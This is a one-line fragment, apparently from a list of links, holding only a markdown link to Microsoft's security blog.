*   [https://www.microsoft.com/security/blog/](https://www.microsoft.com/security/blog/)***